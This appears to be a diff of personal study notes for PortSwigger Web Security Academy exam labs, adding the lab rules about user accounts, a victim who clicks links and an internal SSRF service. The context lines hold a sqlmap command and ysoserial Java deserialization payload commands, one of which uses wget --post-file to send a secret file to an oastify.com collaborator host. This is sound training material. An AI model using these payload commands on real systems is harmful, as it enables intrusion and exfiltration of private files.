@@ -34,3 +34,19 @@ sqlmap -u "https://0aa2002403285f85c21ed0d400d2002a.web-security-academy.net/fil
 └─$ sudo java -jar ysoserial-all.jar CommonsCollections6  'cat /home/carlos/secret' | gzip -f | base64 -w0
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ sudo java -jar ysoserial-all.jar CommonsCollections5 'wget --post-file /home/carlos/secret ynp9d5m2ikdohrfl42gu3zyoyf46s2gr.oastify.com' | gzip -f | base64 -w0
+
+
+
+
+Please read before continuing
+There is always an administrator account with the username 'administrator', plus a lower-privileged account with a username in the following word list. The low-privileged user may have an insecure password in the following list.
+
+Each application has up to one active user, who will be logged in either as a user or an Administrator. You can assume that they will visit the homepage of the site every 15 seconds, and click any links in any emails they receive from the application. You can use exploit server's 'send to victim' functionality to target them with reflected vulnerabilities.
+
+If you find an SSRF vulnerability, you can use it to read the files by accessing an internal-only service running on locahost on port 6566.
+
+
+https://portswigger.net/web-security/authentication/auth-lab-usernames
+https://portswigger.net/web-security/authentication/auth-lab-passwords
+
+
